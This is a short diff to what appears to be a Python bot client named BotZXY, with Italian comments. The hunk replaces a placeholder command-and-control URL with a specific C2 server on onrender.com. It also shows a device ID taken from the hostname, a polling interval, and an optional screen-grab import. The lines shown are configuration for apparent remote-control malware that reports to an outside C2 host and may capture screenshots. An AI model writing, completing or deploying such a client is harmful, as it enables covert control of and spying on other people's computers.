@@ -36,7 +36,7 @@ except ImportError:
     ImageGrab = None
 
 # CONFIGURAZIONE
-C2_URL = "https://tuo-app.onrender.com"  # SOSTITUISCI CON IL TUO URL
+C2_URL = "https://botzxy-c2.onrender.com"  # SOSTITUISCI CON IL TUO URL
 DEVICE_ID = socket.gethostname() + "_" + platform.node()[:8]
 POLL_INTERVAL = 5
 BOT_NAME = "BotZXY"
